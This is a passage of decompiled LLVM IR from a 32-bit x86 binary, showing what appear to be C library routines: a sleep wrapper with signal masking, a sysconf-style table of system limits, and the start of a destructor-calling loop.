  %v2_8053ec9 = load i32, i32* %v1_8053ec9, align 4
  store i32 %v2_8053ec9, i32* @esi, align 4
  store i32 %v2_8053e4c, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053ed8 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053ed8 = call i32 @function_80524ad(i32 2, %_TYPEDEF_sigset_t* %v3_8053ed8, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053ee3 = load i32, i32* @esi, align 4
  %v1_8053ee3 = load i32, i32* @ebx, align 4
  %v2_8053ee3 = inttoptr i32 %v1_8053ee3 to i32*
  store i32 %v0_8053ee3, i32* %v2_8053ee3, align 4
  %v0_8053f78.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f6e

dec_label_pc_8053eea:                             ; preds = %dec_label_pc_8053eac
  %v3_8053eea = load i32, i32* %stack_var_-420, align 4
  %v12_8053eea = icmp eq i32 %v3_8053eea, 1
  %v2_8053ef6 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053ef6, i32* @ebx, align 4
  %v1_8053efd = icmp eq i1 %v12_8053eea, false
  br i1 %v1_8053efd, label %dec_label_pc_8053f24, label %dec_label_pc_8053eff

dec_label_pc_8053eff:                             ; preds = %dec_label_pc_8053eea
  %v0_8053eff = load i32, i32* @edi, align 4
  store i32 %v2_8053ef6, i32* %stack_var_-460, align 4
  %v4_8053f03 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053f03 = call i32 @function_8054897(%timespec* %v4_8053f03, i32 %v2_8053ef6, i32 %v0_8053eff, i32 %v0_8053eff)
  store i32 %v5_8053f03, i32* %eax.global-to-local, align 4
  store i32 %v5_8053f03, i32* @edi, align 4
  %v1_8053f0a = call i32 @function_8052779(i32 %v2_8053ef6)
  store i32 %v1_8053f0a, i32* %eax.global-to-local, align 4
  store i32 %v1_8053f0a, i32* @ebx, align 4
  %v1_8053f14 = inttoptr i32 %v1_8053f0a to i32*
  %v2_8053f14 = load i32, i32* %v1_8053f14, align 4
  store i32 %v2_8053f14, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053f1b = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053f1b = call i32 @function_80524ad(i32 2, %_TYPEDEF_sigset_t* %v3_8053f1b, i32 0)
  store i32 %v4_8053f1b, i32* %eax.global-to-local, align 4
  %v0_8053f20 = load i32, i32* @esi, align 4
  %v1_8053f20 = load i32, i32* @ebx, align 4
  %v2_8053f20 = inttoptr i32 %v1_8053f20 to i32*
  store i32 %v0_8053f20, i32* %v2_8053f20, align 4
  %v0_8053f4a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8053f47

dec_label_pc_8053f24:                             ; preds = %dec_label_pc_8053eea
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8053f2a = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8053f2a = call i32 @function_80524ad(i32 2, %_TYPEDEF_sigset_t* %v3_8053f2a, i32 0)
  store i32 %v4_8053f2a, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053f40

dec_label_pc_8053f35:                             ; preds = %dec_label_pc_8053e67
  %v2_8053f37 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053f37, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f40

dec_label_pc_8053f40:                             ; preds = %dec_label_pc_8053f24, %dec_label_pc_8053f35
  %storemerge3.pre-phi = phi i32 [ %v2_8053ef6, %dec_label_pc_8053f24 ], [ %v2_8053f37, %dec_label_pc_8053f35 ]
  %v3_8053f40 = phi i32 [ %v2_8053e4c, %dec_label_pc_8053f24 ], [ %v4_8053e6c, %dec_label_pc_8053f35 ]
  %v2_8053f40 = phi i32 [ 0, %dec_label_pc_8053f24 ], [ %v4_8053e6c, %dec_label_pc_8053f35 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8053f40 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8053f40 = call i32 @function_8054897(%timespec* %v4_8053f40, i32 %storemerge3.pre-phi, i32 %v2_8053f40, i32 %v3_8053f40)
  store i32 %v5_8053f40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f47

dec_label_pc_8053f47:                             ; preds = %dec_label_pc_8053eff, %dec_label_pc_8053f40
  %v0_8053f4a = phi i32 [ %v0_8053f4a.pre, %dec_label_pc_8053eff ], [ %v5_8053f40, %dec_label_pc_8053f40 ]
  %v1_8053f4a = icmp eq i32 %v0_8053f4a, 0
  br i1 %v1_8053f4a, label %dec_label_pc_8053f67, label %dec_label_pc_8053f4e

dec_label_pc_8053f4e:                             ; preds = %dec_label_pc_8053f47
  %v4_8053f5e = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8053f5e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f6e

dec_label_pc_8053f67:                             ; preds = %dec_label_pc_8053df0, %dec_label_pc_8053f47
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f6e

dec_label_pc_8053f6b:                             ; preds = %dec_label_pc_8053e90, %dec_label_pc_8053e4b, %dec_label_pc_8053e1d
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053f6e

dec_label_pc_8053f6e:                             ; preds = %dec_label_pc_8053f67, %dec_label_pc_8053f4e, %dec_label_pc_8053ec2, %dec_label_pc_8053f6b
  %v0_8053f78 = phi i32 [ 0, %dec_label_pc_8053f67 ], [ %v4_8053f5e, %dec_label_pc_8053f4e ], [ %v0_8053f78.pre, %dec_label_pc_8053ec2 ], [ -1, %dec_label_pc_8053f6b ]
  store i32 %v0_8053df3, i32* @ebx, align 4
  store i32 %v0_8053df2, i32* @esi, align 4
  store i32 %v0_8053df1, i32* @edi, align 4
  store i32 %v0_8053df0, i32* @ebp, align 4
  ret i32 %v0_8053f78

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8053f0a, { 1, 0, 2 }
  uselistorder i32 %v2_8053ef6, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8053e8d, { 2, 1, 0 }
  uselistorder i32 %v4_8053e6c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8053e4c, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_8053e33, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8053e1a, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 5, 6, 0, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 24, 25, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @function_805433f, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_8052b8e, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8053f6e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8053f67, { 1, 0 }
  uselistorder label %dec_label_pc_8053f47, { 1, 0 }
  uselistorder label %dec_label_pc_8053f40, { 1, 0 }
  uselistorder label %dec_label_pc_8053e82.dec_label_pc_8053e82_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_8053e0f.dec_label_pc_8053e0f_crit_edge, { 1, 0 }
}

define i32 @function_8053f79(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053f79:
  switch i32 %arg1, label %dec_label_pc_8053f98 [
    i32 0, label %dec_label_pc_8053fa8
    i32 1, label %dec_label_pc_805408d
    i32 2, label %dec_label_pc_8053fb2
    i32 3, label %dec_label_pc_8053fbc
    i32 4, label %dec_label_pc_8053fc6
    i32 5, label %dec_label_pc_805405c
    i32 6, label %dec_label_pc_8053fce
    i32 7, label %dec_label_pc_8053f8e
    i32 8, label %dec_label_pc_8053f8e
    i32 9, label %dec_label_pc_8053f8e
    i32 10, label %dec_label_pc_8053f8e
    i32 11, label %dec_label_pc_8053f8e
    i32 12, label %dec_label_pc_8053f8e
    i32 13, label %dec_label_pc_8053f8e
    i32 14, label %dec_label_pc_8053f8e
    i32 15, label %dec_label_pc_8053f8e
    i32 16, label %dec_label_pc_8053f8e
    i32 17, label %dec_label_pc_8053f8e
    i32 18, label %dec_label_pc_8053f8e
    i32 19, label %dec_label_pc_8053f8e
    i32 20, label %dec_label_pc_8053f8e
    i32 21, label %dec_label_pc_8053f8e
    i32 22, label %dec_label_pc_8053f8e
    i32 23, label %dec_label_pc_805408d
    i32 24, label %dec_label_pc_805408d
    i32 25, label %dec_label_pc_8054099
    i32 26, label %dec_label_pc_805406a
    i32 27, label %dec_label_pc_805408d
    i32 28, label %dec_label_pc_8053fe0
    i32 29, label %dec_label_pc_8054063
    i32 30, label %dec_label_pc_8053fd8
    i32 31, label %dec_label_pc_8054078
    i32 32, label %dec_label_pc_805408d
    i32 33, label %dec_label_pc_805408d
    i32 34, label %dec_label_pc_805408d
    i32 35, label %dec_label_pc_8054071
    i32 36, label %dec_label_pc_80540a0
    i32 37, label %dec_label_pc_80540a7
    i32 38, label %dec_label_pc_80540a0
    i32 39, label %dec_label_pc_8053fea
    i32 40, label %dec_label_pc_80540ae
    i32 41, label %dec_label_pc_805408d
    i32 42, label %dec_label_pc_8054078
    i32 43, label %dec_label_pc_80540a7
    i32 44, label %dec_label_pc_80540b5
    i32 45, label %dec_label_pc_80540a7
    i32 46, label %dec_label_pc_8054063
    i32 47, label %dec_label_pc_8054063
    i32 48, label %dec_label_pc_8054063
    i32 49, label %dec_label_pc_805408d
    i32 50, label %dec_label_pc_805408d
    i32 51, label %dec_label_pc_8054063
    i32 52, label %dec_label_pc_8054063
    i32 53, label %dec_label_pc_805408d
    i32 54, label %dec_label_pc_805408d
    i32 55, label %dec_label_pc_805408d
    i32 56, label %dec_label_pc_805408d
    i32 57, label %dec_label_pc_805408d
    i32 58, label %dec_label_pc_805408d
    i32 59, label %dec_label_pc_805408d
    i32 60, label %dec_label_pc_805408d
    i32 61, label %dec_label_pc_805408d
    i32 62, label %dec_label_pc_805408d
    i32 63, label %dec_label_pc_805408d
    i32 64, label %dec_label_pc_805408d
    i32 65, label %dec_label_pc_805408d
    i32 66, label %dec_label_pc_805408d
    i32 67, label %dec_label_pc_8053f8e
    i32 68, label %dec_label_pc_8053f8e
    i32 69, label %dec_label_pc_8054071
    i32 70, label %dec_label_pc_8054071
    i32 71, label %dec_label_pc_8054071
    i32 72, label %dec_label_pc_8054078
    i32 73, label %dec_label_pc_805407f
    i32 74, label %dec_label_pc_8054086
    i32 75, label %dec_label_pc_8053ff4
    i32 76, label %dec_label_pc_8054086
    i32 77, label %dec_label_pc_8053f8e
    i32 78, label %dec_label_pc_8053f8e
    i32 79, label %dec_label_pc_8053f8e
    i32 80, label %dec_label_pc_8053f8e
    i32 81, label %dec_label_pc_8053f8e
    i32 82, label %dec_label_pc_8053f8e
    i32 83, label %dec_label_pc_8053f8e
    i32 84, label %dec_label_pc_8053f8e
    i32 85, label %dec_label_pc_805408d
    i32 86, label %dec_label_pc_805408d
    i32 87, label %dec_label_pc_805406a
    i32 88, label %dec_label_pc_8053ffe
    i32 89, label %dec_label_pc_8054008
    i32 90, label %dec_label_pc_805407f
    i32 91, label %dec_label_pc_8053f8e
    i32 92, label %dec_label_pc_8053f8e
    i32 93, label %dec_label_pc_8053f8e
    i32 94, label %dec_label_pc_8053f8e
    i32 95, label %dec_label_pc_8054063
    i32 96, label %dec_label_pc_805408d
    i32 97, label %dec_label_pc_805408d
    i32 98, label %dec_label_pc_8053f8e
    i32 99, label %dec_label_pc_8053f8e
    i32 100, label %dec_label_pc_8053f8e
    i32 101, label %dec_label_pc_8054012
    i32 102, label %dec_label_pc_8054055
    i32 103, label %dec_label_pc_8054092
    i32 104, label %dec_label_pc_805406a
    i32 105, label %dec_label_pc_805401c
    i32 106, label %dec_label_pc_8054078
    i32 107, label %dec_label_pc_8054078
    i32 108, label %dec_label_pc_805405c
    i32 109, label %dec_label_pc_8054099
    i32 110, label %dec_label_pc_80540b5
    i32 111, label %dec_label_pc_8054055
    i32 112, label %dec_label_pc_8054092
    i32 113, label %dec_label_pc_80540b5
    i32 114, label %dec_label_pc_8054026
    i32 115, label %dec_label_pc_80540ae
    i32 116, label %dec_label_pc_805408d
    i32 117, label %dec_label_pc_805408d
    i32 118, label %dec_label_pc_8054030
    i32 119, label %dec_label_pc_805403a
    i32 120, label %dec_label_pc_80540a7
    i32 121, label %dec_label_pc_805406a
    i32 122, label %dec_label_pc_805406a
    i32 123, label %dec_label_pc_805406a
    i32 124, label %dec_label_pc_805406a
    i32 125, label %dec_label_pc_8053f8e
    i32 126, label %dec_label_pc_8053f8e
    i32 127, label %dec_label_pc_805408d
    i32 128, label %dec_label_pc_805408d
    i32 129, label %dec_label_pc_8053f8e
    i32 130, label %dec_label_pc_8053f8e
    i32 131, label %dec_label_pc_805408d
    i32 149, label %dec_label_pc_8054041
  ]

dec_label_pc_8053f8e:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8053f98:                             ; preds = %dec_label_pc_8053f79
  %v1_8053f98 = call i32 @function_8052779(i32 ptrtoint (i32* @0 to i32))
  %v1_8053f9d = inttoptr i32 %v1_8053f98 to i32*
  store i32 22, i32* %v1_8053f9d, align 4
  br label %dec_label_pc_805408d

dec_label_pc_8053fa8:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8053fb2:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8053fbc:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8053fc6:                             ; preds = %dec_label_pc_8053f79
  %v0_8053fc9 = call i32 @function_80546c5()
  br label %dec_label_pc_8053fce

dec_label_pc_8053fce:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053fc6
  br label %dec_label_pc_80540ba

dec_label_pc_8053fd8:                             ; preds = %dec_label_pc_8053f79
  %v0_8053fdb = call i32 @function_805475c()
  br label %dec_label_pc_8053fe0

dec_label_pc_8053fe0:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053fd8
  br label %dec_label_pc_80540ba

dec_label_pc_8053fea:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8053ff4:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8053ffe:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054008:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054012:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_805401c:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054026:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054030:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_805403a:                             ; preds = %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054041:                             ; preds = %dec_label_pc_8053f79
  %v5_8054047 = call i32 @function_80544c8(i32 1, %timespec* null, i32 149, i32 149)
  %v2_805404f = icmp slt i32 %v5_8054047, 0
  %v1_8054051 = icmp eq i1 %v2_805404f, false
  br i1 %v1_8054051, label %dec_label_pc_8054063, label %dec_label_pc_805408d

dec_label_pc_8054055:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_805405c:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054063:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8054041
  br label %dec_label_pc_80540ba

dec_label_pc_805406a:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054071:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054078:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_805407f:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054086:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_805408d:                             ; preds = %dec_label_pc_8054041, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f98
  br label %dec_label_pc_80540ba

dec_label_pc_8054092:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_8054099:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_80540a0:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_80540a7:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_80540ae:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_80540b5:                             ; preds = %dec_label_pc_8053f79, %dec_label_pc_8053f79, %dec_label_pc_8053f79
  br label %dec_label_pc_80540ba

dec_label_pc_80540ba:                             ; preds = %dec_label_pc_80540ae, %dec_label_pc_80540a7, %dec_label_pc_80540a0, %dec_label_pc_8054099, %dec_label_pc_8054092, %dec_label_pc_8054086, %dec_label_pc_805407f, %dec_label_pc_8054078, %dec_label_pc_8054071, %dec_label_pc_805406a, %dec_label_pc_805405c, %dec_label_pc_8054055, %dec_label_pc_8054063, %dec_label_pc_805403a, %dec_label_pc_8054030, %dec_label_pc_8054026, %dec_label_pc_805401c, %dec_label_pc_8054012, %dec_label_pc_8054008, %dec_label_pc_8053ffe, %dec_label_pc_8053ff4, %dec_label_pc_8053fea, %dec_label_pc_8053fe0, %dec_label_pc_8053fce, %dec_label_pc_8053fbc, %dec_label_pc_8053fb2, %dec_label_pc_8053fa8, %dec_label_pc_8053f8e, %dec_label_pc_805408d, %dec_label_pc_80540b5
  %v0_80540bd = phi i32 [ 255, %dec_label_pc_80540ae ], [ 2048, %dec_label_pc_80540a7 ], [ 99, %dec_label_pc_80540a0 ], [ 20, %dec_label_pc_8054099 ], [ -128, %dec_label_pc_8054092 ], [ 1024, %dec_label_pc_8054086 ], [ 4, %dec_label_pc_805407f ], [ 32, %dec_label_pc_8054078 ], [ 256, %dec_label_pc_8054071 ], [ 2147483647, %dec_label_pc_805406a ], [ 16, %dec_label_pc_805405c ], [ 127, %dec_label_pc_8054055 ], [ 200112, %dec_label_pc_8054063 ], [ 9, %dec_label_pc_805403a ], [ 65535, %dec_label_pc_8054030 ], [ -32768, %dec_label_pc_8054026 ], [ -2147483648, %dec_label_pc_805401c ], [ 8, %dec_label_pc_8054012 ], [ 500, %dec_label_pc_8054008 ], [ 4096, %dec_label_pc_8053ffe ], [ 16384, %dec_label_pc_8053ff4 ], [ 1000, %dec_label_pc_8053fea ], [ 32768, %dec_label_pc_8053fe0 ], [ 6, %dec_label_pc_8053fce ], [ 65536, %dec_label_pc_8053fbc ], [ 100, %dec_label_pc_8053fb2 ], [ 131072, %dec_label_pc_8053fa8 ], [ 1, %dec_label_pc_8053f8e ], [ -1, %dec_label_pc_805408d ], [ 32767, %dec_label_pc_80540b5 ]
  ret i32 %v0_80540bd

; uselistorder directives
  uselistorder i32 65536, { 33, 34, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 15, 13, 16, 18, 17, 19, 1, 20, 0, 2, 23, 21, 24, 22, 27, 25, 26, 28, 29, 30, 31, 32 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 20, 21, 23, 24, 14, 15, 1, 2, 12, 13, 16, 17, 18, 19, 3, 4, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 -2147483648, { 0, 2, 1 }
  uselistorder i32 65535, { 3, 0, 1, 2, 4 }
  uselistorder i32 1024, { 2, 0, 3, 1, 4 }
  uselistorder i32 2048, { 5, 1, 6, 2, 0, 3, 4 }
  uselistorder i32 255, { 1, 3, 4, 6, 2, 7, 8, 9, 5, 0 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 131, { 4, 0, 1, 3, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 124, { 4, 5, 3, 0, 1, 6, 2 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 117, { 2, 0, 1 }
  uselistorder i32 116, { 1, 2, 0 }
  uselistorder i32 112, { 3, 0, 1, 4, 5, 2, 6, 7, 8 }
  uselistorder i32 111, { 4, 0, 2, 1, 3 }
  uselistorder i32 110, { 5, 1, 3, 2, 4, 0 }
  uselistorder i32 108, { 20, 21, 22, 17, 23, 11, 2, 15, 0, 1, 24, 12, 13, 18, 19, 25, 26, 14, 27, 3, 4, 5, 28, 29, 6, 30, 7, 8, 9, 10, 16, 31 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 104, { 2, 3, 4, 1, 6, 5, 0 }
  uselistorder i32 99, { 2, 3, 1, 0 }
  uselistorder i32 96, { 1, 2, 3, 0, 4 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 92, { 11, 12, 1, 0, 4, 2, 3, 6, 13, 14, 9, 10, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 8, 26, 27, 28, 5, 29, 30, 7, 35, 32, 33, 34, 31, 36 }
  uselistorder i32 87, { 2, 0, 1 }
  uselistorder i32 83, { 2, 0, 1 }
  uselistorder i32 80, { 1, 2, 0 }
  uselistorder i32 76, { 3, 4, 1, 5, 0, 6, 2 }
  uselistorder i32 68, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 60, { 3, 0, 1, 2 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 55, { 2, 0, 1, 3 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 46, { 1, 2, 0 }
  uselistorder i32 43, { 7, 0, 3, 1, 4, 2, 5, 8, 6 }
  uselistorder i32 42, { 1, 2, 0 }
  uselistorder i32 41, { 1, 2, 3, 0 }
  uselistorder i32 39, { 1, 2, 3, 0 }
  uselistorder i32 38, { 2, 0, 3, 4, 1 }
  uselistorder i32 37, { 2, 0, 3, 4, 1 }
  uselistorder i32 34, { 3, 4, 5, 2, 0, 1, 6, 7, 8 }
  uselistorder i32 33, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 29, { 2, 0, 1 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 25, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 23, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 21, { 3, 1, 2, 4, 5, 6, 0 }
  uselistorder i32 17, { 8, 5, 7, 2, 3, 1, 0, 4, 6, 9, 10 }
  uselistorder i32 13, { 3, 0, 1, 2, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 9, { 3, 11, 0, 1, 7, 16, 6, 4, 8, 5, 9, 14, 13, 12, 17, 18, 19, 20, 21, 22, 23, 10, 15, 2 }
  uselistorder i32 6, { 0, 14, 4, 5, 1, 28, 6, 2, 7, 16, 15, 17, 18, 19, 20, 21, 22, 23, 11, 8, 12, 13, 24, 25, 26, 27, 9, 3, 10 }
  uselistorder i32 5, { 13, 1, 18, 19, 7, 6, 8, 5, 15, 16, 14, 4, 2, 3, 17, 0, 9, 10, 12, 11 }
  uselistorder label %dec_label_pc_80540ba, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_805408d, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_8054063, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053fe0, { 1, 0 }
  uselistorder label %dec_label_pc_8053fce, { 1, 0 }
}

define i32 @function_80540be() local_unnamed_addr {
dec_label_pc_80540be:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80540be = load i32, i32* @ebx, align 4
  store i32 %v0_80540be, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32 0), label %dec_label_pc_80540d2, label %dec_label_pc_80540df

dec_label_pc_80540d2:                             ; preds = %dec_label_pc_80540be, %dec_label_pc_80540d2
  %v1_80540d98 = phi i32 [ %v1_80540d9, %dec_label_pc_80540d2 ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32 -1), %dec_label_pc_80540be ]
  store i32 ptrtoint (i32* @global_var_80540d9.234 to i32), i32* %stack_var_-16, align 4
  %v5_80540d2 = mul i32 %v1_80540d98, 4
  %v6_80540d2 = add i32 %v5_80540d2, ptrtoint (i32* @global_var_8056844.233 to i32)
  %v7_80540d2 = inttoptr i32 %v6_80540d2 to i32*
  %v8_80540d2 = load i32, i32* %v7_80540d2, align 4
  call void @__pseudo_call(i32 %v8_80540d2)
  %v0_80540d9.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80540d9 = add i32 %v0_80540d9.pre, -1
  store i32 %v1_80540d9, i32* %ebx.global-to-local, align 4
  %v10_80540da = icmp eq i32 %v0_80540d9.pre, 0
  %v1_80540dd = icmp eq i1 %v10_80540da, false
  br i1 %v1_80540dd, label %dec_label_pc_80540d2, label %dec_label_pc_80540df

dec_label_pc_80540df:                             ; preds = %dec_label_pc_80540d2, %dec_label_pc_80540be
  %v0_80540df = load i32, i32* @global_var_80569a8.235, align 8
  %v1_80540e4 = icmp eq i32 %v0_80540df, 0
  br i1 %v1_80540e4, label %dec_label_pc_80540ea, label %dec_label_pc_80540e8

dec_label_pc_80540e8:                             ; preds = %dec_label_pc_80540df
  %v0_80540e8 = load i32, i32* %stack_var_-16, align 4
  %v1_80540e8 = call i32 @unknown_0(i32 %v0_80540e8)
  br label %dec_label_pc_80540ea

dec_label_pc_80540ea:                             ; preds = %dec_label_pc_80540e8, %dec_label_pc_80540df
